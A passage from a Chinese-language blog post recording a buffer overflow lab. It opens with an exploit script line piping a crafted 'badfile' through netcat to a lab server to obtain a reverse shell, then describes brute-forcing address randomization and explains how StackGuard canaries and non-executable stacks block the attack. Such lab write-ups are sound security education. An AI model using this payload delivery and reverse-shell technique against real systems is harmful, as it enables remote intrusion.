class="comment"># 如果攻击成功，反向shell会连到另一个窗口</span></span><br><span class="line">    <span class="built_in">print</span>(os.system(<span class="string">&quot;cat badfile | nc 10.9.0.8 9090&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>打开一个终端开始监听 <code>9090</code> 端口，然后在另一个端口上执行 <code>expolit.py</code> ，破解成功：<img src="%E4%BB%BB%E5%8A%A15-2_%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.png" alt="任务5-2暴力破解"></p>
<p>最终 <code>Ret Address</code> 停在 <code>0x7fffffffe8f0</code> ，表示跳转在此地址时，能够成功跳转到 <code>main</code> 函数栈帧。</p>
<h2 id="任务-6：实验地址随机化">任务 6：实验地址随机化</h2>
<p>当我们开启地址空间布局随机化后，这是向 <code>server1</code> 发送后得到的响应： <img src="%E4%BB%BB%E5%8A%A16-1_%E5%A4%9A%E6%AC%A1%E5%8F%91%E9%80%81server1.png" alt="任务6-1多次发送server1"></p>
<p>这是向 <code>server3</code> 发送后得到的响应：<img src="%E4%BB%BB%E5%8A%A16-2_%E5%A4%9A%E6%AC%A1%E5%8F%91%E9%80%81server3.png" alt="任务6-2多次发送server3"></p>
<p>我们发现每次重启服务器后，服务器在内存空间的地址都不一样，也就是说我们第一次尝试发送 hello 从而获得的 <code>buffer_addr</code> 和 <code>ebp_addr</code> 在下一次准备发送 <code>badfile</code> 时就不一致了，这使得我们上面的方案失效。</p>
<p>由于在 32 位 Linux 系统中，可用进行地址随机化的比特数仅为 19 比特。这不够用，如果我们反复运行攻击，则很容易击中目标。尝试暴力破解：<img src="%E4%BB%BB%E5%8A%A16-3_%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.png" alt="任务6-3暴力破解"></p>
<p>这一次足够幸运，我们发现仅仅只过了37s就成功获取了反向shell。</p>
<h2 id="任务-7：实验其他防护措施">任务 7：实验其他防护措施</h2>
<h3 id="任务-7-a-启用-StackGuard-保护">任务 7.a: 启用 StackGuard 保护</h3>
<h4 id="现象">现象</h4>
<p>当我们去掉 <code>-fno-stack-protector</code> 重新编译，并再次运行攻击命令 <code>$ ./stack-L1 &lt; badfile</code> 时，我们观察到：<img src="%E4%BB%BB%E5%8A%A17-1_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BF%9D%E9%9A%9C.png" alt="任务7-1缓冲区溢出保障"></p>
<p>可见系统报错 <code>stack smashing detected</code> 。这意味着程序知道有人在攻击它。</p>
<h4 id="原理">原理</h4>
<p>通过网上查询资料，当我们开启 StackGuard 后，编译器会往每个栈帧的局部变量和控制信息 (EBP/RET) 之间中插入一个随机生成的整数，术语叫 <strong>Canary（金丝雀）</strong>。</p>
<p>内存分布为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ Buffer ] ---&gt; [ 金丝雀 (Canary) ] ---&gt; [ Saved EBP ] ---&gt; [ Return Address ]</span><br></pre></td></tr></table></figure>
<p>检测逻辑：</p>
<ul>
<li>
<p>**函数开始 **： 程序从 <code>gs</code> 寄存器（一个特殊的段寄存器，存放线程局部存储）中取出一个随机数，把它放到栈上的 Canary 位置。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]  ; 取随机数</span><br><span class="line">mov    qword ptr [rbp-0x8], rax  ; 放到栈里</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>溢出攻击</strong>： 例如 <code>strcpy</code> 操作不加区分地向高地址写入数据。</p>
<ul>
<li>覆盖 Buffer</li>
<li>覆盖 Canary</li>
<li>覆盖 Saved EBP</li>
<li>覆盖 Return Address</li>
</ul>
</li>
<li>
<p><strong>函数结束</strong>： 在执行 <code>ret</code> 指令跳转之前，程序会先执行检查：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx, qword ptr [rbp-0x8]  ; 把栈里的 Canary 拿出来</span><br><span class="line">xor    rdx, qword ptr fs:[0x28]  ; 和原本的随机数对比</span><br><span class="line">je     normal_return             ; 如果一样，说明没被破坏，正常返回</span><br><span class="line">call   __stack_chk_fail          ; 如果不一样，报错</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>因为溢出攻击不可避免地修改了位于 Buffer 和 Return Address 之间的 Canary 值，检查步骤就会发现不一致，从而调用 <code>__stack_chk_fail</code> 函数。</p>
<p>这个函数会做两件事：</p>
<ol>
<li>向屏幕打印 <code>*** stack smashing detected ***</code>。</li>
<li>调用 <code>abort()</code> 立即终止程序。</li>
</ol>
<h3 id="任务-7-b-启用不可执行栈保护">任务 7.b: 启用不可执行栈保护</h3>
<p>当我们使用 <code>-z noexecstack</code>  重新编译 <code>call_shellcode.c</code> 后，重新运行程序，得到：<img src="%E4%BB%BB%E5%8A%A17-2_noexecstack.png" alt="任务7-2noexecstack"></p>
<p>程序试图跳到栈上执行 <code>shellcode</code> ，被操作系统杀死了。</p>
<p>原因是使用 <code>-z noexecstack</code> 编译程序时，GCC 链接器会在可执行文件的头部打上一个标记，告诉操作系统内核：栈只有读写权限，没有执行权限。</p>
<p>当程序加载进内存时，操作系统会将栈内存页的权限设置为 RW- (Read, Write, No Execute)。</p>
<ul>
<li>代码段 (Text Segment)：<code>R-X</code> (可读，可执行，不可写)</li>
<li>栈段 (Stack Segment)：<code>RW-</code> (可读，可写，不可执行)</li>
</ul>
<p>当 <code>call_shellcode.c</code> 运行到跳转指令时：</p>
<ol>
<li>CPU 的取指单元尝试从栈地址（例如 <code>0xbfff...</code>）读取指令。</li>
<li>CPU 的内存管理单元（MMU）检查该地址的页表权限。</li>
<li>MMU 发现该页面标记了 NX (不可执行)。</li>
<li>MMU 抛出硬件异常。</li>
<li>操作系统内核捕获这个异常，判定该进程试图执行数据区的代码，属于非法操作。</li>
<li>操作系统发送 <code>SIGSEGV</code> 信号终止进程。</li>
</ol>
<p>但是这并不能修复缓冲区溢出（数据依然溢出了，返回地址依然被覆盖了），它只是阻止了你在栈上执行代码。黑客们因此发明了 <strong>Return-to-Libc</strong> 和 <strong>ROP (面向返回编程)</strong> 技术，利用已有的代码（如 libc 库函数）来绕过这一防御。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xelinquency.github.io/">Illunight</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xelinquency.github.io/2025/11/26/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">https://xelinquency.github.io/2025/11/26/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://XELINQUENCY.github.io" target="_blank">Illunight的收藏品</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%9E%E9%AA%8C%E8%AE%B0%E5%BD%95/">实验记录</a><a class="post-meta__tags" href="/tags/DKP/">DKP</a></div><div class="post-share"><div class="social-share" data-image="/img/404.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/11/21/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/" title="SQL 注入攻击实验"><img class="cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SQL 注入攻击实验</div></div></div></a><a class="pagination-related  no-desc" href="/2026/01/29/%E8%AE%B0%E6%9F%90%E6%B8%B8%E6%88%8F%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E5%88%86%E6%9E%90/" title="记某游戏登录验证分析"><img class="cover" src="/img/404.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">记某游戏登录验证分析</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/11/09/PA1/" title="PA1"><img class="cover" src="/img/404.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-09</div><div class="info-item-2">PA1</div></div></div></a><a class="pagination-related no-desc" href="/2025/11/21/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/" title="SQL 注入攻击实验"><img class="cover" src="/img/404.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-21</div><div class="info-item-2">SQL 注入攻击实验</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Illunight</div><div class="author-info-description">CTF, Furry and others</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn"><i></i><span>点开看看这是个啥</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/XELINQUENCY" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://res.abeim.cn/api/qq/?qq=3778180207" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #302425;"></i></a><a class="social-icon" href="mailto:xelinquency@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">子雨的碎碎念博客！启用于2025年7月</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">缓冲区溢出攻击实验</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-1-%E7%86%9F%E6%82%89-Shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">任务 1: 熟悉 Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-2%EF%BC%9A%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.2.</span> <span class="toc-text">任务 2：第一关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E4%B9%A0"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">复习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-3-%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">1.3.</span> <span class="toc-text">任务 3: 第二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-4%EF%BC%9A%E7%AC%AC-3-%E5%85%B3"><span class="toc-number">1.4.</span> <span class="toc-text">任务 4：第 3 关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-5%EF%BC%9A%E7%AC%AC-4-%E5%85%B3"><span class="toc-number">1.5.</span> <span class="toc-text">任务 5：第 4 关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-6%EF%BC%9A%E5%AE%9E%E9%AA%8C%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">任务 6：实验地址随机化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-7%EF%BC%9A%E5%AE%9E%E9%AA%8C%E5%85%B6%E4%BB%96%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-number">1.7.</span> <span class="toc-text">任务 7：实验其他防护措施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-7-a-%E5%90%AF%E7%94%A8-StackGuard-%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.7.1.</span> <span class="toc-text">任务 7.a: 启用 StackGuard 保护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%B0%E8%B1%A1"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">现象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.7.1.2.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-7-b-%E5%90%AF%E7%94%A8%E4%B8%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%88%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.7.2.</span> <span class="toc-text">任务 7.b: 启用不可执行栈保护</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By Illunight</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div><div class="footer_custom_text">幻夜子雨想要留下flag{Th4nk5_f0R_V1siTing!}</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      true
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="在知识的荒原里找到你需要的" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>